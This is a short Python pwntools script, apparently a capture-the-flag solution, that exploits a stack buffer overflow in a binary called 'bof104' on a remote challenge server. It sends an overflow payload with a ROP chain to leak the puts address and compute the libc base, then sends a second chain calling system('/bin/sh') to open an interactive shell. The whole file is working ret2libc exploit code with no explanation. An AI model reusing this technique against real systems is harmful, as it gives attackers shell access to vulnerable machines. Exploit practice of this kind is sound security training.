from pwn import *
from Crypto.Util.number import *

# io = process('./bof104')
io = remote('bof104.sstf.site', '1337')
elf = ELF('./bof104')
libc = ELF('./libc.so.6')
context.binary = elf

rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.bofme()

print(rop.chain())

io.sendline(b'A' * 0x20 + b'BBBBBBBB' + rop.chain())
io.recvline()
# puts_addr = bytes_to_long(io.recvline()[::-1])
puts_addr = u64(io.recvline()[:-1].ljust(8, b'\x00'))
libc.address = puts_addr - libc.symbols["puts"]
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
print(hex(puts_addr))
print(hex(bin_sh_addr))

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(bin_sh_addr)

io.sendline(b'A' * 0x20 + b'BBBBBBBB' + rop.chain())
io.interactive()
